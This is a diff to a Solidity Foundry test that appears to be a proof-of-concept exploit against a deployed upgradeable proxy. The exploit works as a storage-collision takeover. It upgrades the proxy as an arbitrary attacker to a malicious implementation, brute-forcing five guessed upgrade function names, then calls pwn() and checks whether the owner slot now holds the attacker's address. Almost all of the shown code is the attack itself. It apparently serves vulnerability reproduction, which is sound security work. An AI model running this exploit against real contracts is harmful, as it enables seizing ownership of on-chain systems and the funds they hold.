@@ -46,28 +46,68 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
+    /// The owner observable: a named getter when one exists, else the proxy's
+    /// slot 0 — which is exactly what a collision targets. The reader is a guess
+    /// too, and a single name reads as "not reproduced" when it is wrong.
+    function _ownerOf(address who) internal view returns (bool found, address owner_) {
+        (bool ok, bytes memory ret) = who.staticcall(abi.encodeWithSignature("owner()"));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
+        (ok, ret) = who.staticcall(abi.encodeWithSignature("admin()"));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
+        (ok, ret) = who.staticcall(abi.encodeWithSignature("getOwner()"));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
+        return (true, address(uint160(uint256(vm.load(who, bytes32(uint256(0)))))));
+    }
+
+    /// Point the proxy at the attacker's implementation, then run its code and
+    /// see whether the owner observable moved. Success is that observable — the
+    /// upgrade call returning proves nothing on its own.
+    function _upgradeAndPwn(address attacker, string memory label, bytes memory upgradeData)
+        internal
+        returns (bool)
+    {
+        vm.prank(attacker);
+        (bool upOk,) = target.call(upgradeData);
+        console.log("tried", label, upOk ? "call returned" : "call reverted");
+        if (!upOk) return false;
+        vm.prank(attacker);
+        (bool pwnOk,) = target.call(abi.encodeWithSignature("pwn()"));
+        if (!pwnOk) return false;
+        (bool found, address o) = _ownerOf(target);
+        return found && o == attacker;
+    }
+
     function test_exploit() public {
         address attackerEOA = makeAddr("attacker");
         vm.deal(attackerEOA, 1 ether);
         AttackImpl attackImpl = new AttackImpl();
 
-        // Upgrade the proxy to the attacker's implementation -- as ANYONE.
-        vm.prank(attackerEOA);
-        (bool upOk,) = target.call(
-            abi.encodeWithSignature("upgradeTo(address)", address(attackImpl))
+        (, address ownerBefore) = _ownerOf(target);
+
+        // The upgrade entry point is a GUESS on an unverified proxy.
+        bool reproduced;
+        if (!reproduced) {
+            reproduced = _upgradeAndPwn(attackerEOA, "upgradeTo(address)", abi.encodeWithSignature("upgradeTo(address)", address(attackImpl)));
+        }
+        if (!reproduced) {
+            reproduced = _upgradeAndPwn(attackerEOA, "setImplementation(address)", abi.encodeWithSignature("setImplementation(address)", address(attackImpl)));
+        }
+        if (!reproduced) {
+            reproduced = _upgradeAndPwn(attackerEOA, "upgrade(address)", abi.encodeWithSignature("upgrade(address)", address(attackImpl)));
+        }
+        if (!reproduced) {
+            reproduced = _upgradeAndPwn(attackerEOA, "setLogic(address)", abi.encodeWithSignature("setLogic(address)", address(attackImpl)));
+        }
+        if (!reproduced) {
+            reproduced = _upgradeAndPwn(attackerEOA, "upgradeToAndCall(address,bytes)", abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(attackImpl), bytes("")));
+        }
+
+        (, address owner_) = _ownerOf(target);
+        console.log("proxy owner before:", ownerBefore);
+        console.log("proxy owner after:", owner_);
+        assertTrue(
+            reproduced,
+            "no upgrade entry point let an arbitrary caller collide storage. Tried upgradeTo(address), setImplementation(address), upgrade(address), setLogic(address), upgradeToAndCall(address,bytes). This does NOT establish safety: the upgrade may be guarded, named differently, or take other arguments."
         );
-        require(upOk, "upgradeTo failed -- upgrade is guarded or entry differs (adapt it)");
-
-        // New implementation code now runs in the proxy's storage.
-        vm.prank(attackerEOA);
-        (bool pwnOk,) = target.call(abi.encodeWithSignature("pwn()"));
-        require(pwnOk, "pwn() on upgraded proxy failed");
-
-        (bool ownerOk, bytes memory ret) =
-            target.staticcall(abi.encodeWithSignature("owner()"));
-        require(ownerOk, "proxy has no owner() view -- check slot 0 via vm.load");
-        address owner_ = abi.decode(ret, (address));
-        console.log("proxy owner after collision upgrade:", owner_);
-        assertEq(owner_, attackerEOA, "exploit did not reproduce: storage not collided");
     }
 }
